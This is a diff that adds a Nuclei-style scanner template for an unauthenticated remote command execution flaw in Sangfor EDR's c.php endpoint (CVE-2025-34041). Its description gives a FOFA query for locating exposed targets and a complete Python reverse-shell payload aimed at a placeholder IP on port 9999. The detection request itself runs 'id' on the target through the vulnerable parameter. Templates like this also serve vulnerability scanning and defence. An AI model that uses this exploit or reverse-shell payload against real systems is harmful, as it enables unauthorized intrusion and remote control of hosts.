@@ -1,0 +1,33 @@
+id: sangfor-edr-cphp-rce
+
+info:
+  name: "深信服EDR c.php 远程命令执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="sangfor-EDR"
+        Sangfor EDR contains a remote code execution vulnerability in the /tool/log/c.php endpoint via the strip_slashes parameter that allows unauthenticated attackers to execute arbitrary system commands.
+        POST /tool/log/c.php HTTP/1.1
+    
+    strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+  reference:
+    - CVE-2025-34041
+  tags: 深信服EDR
+
+http:
+  - raw:
+      - |
+        GET /tool/log/c.php?strip_slashes=system&limit=id HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - 'uid'
+      - type: word
+        part: body
+        words:
+          - 'gif'
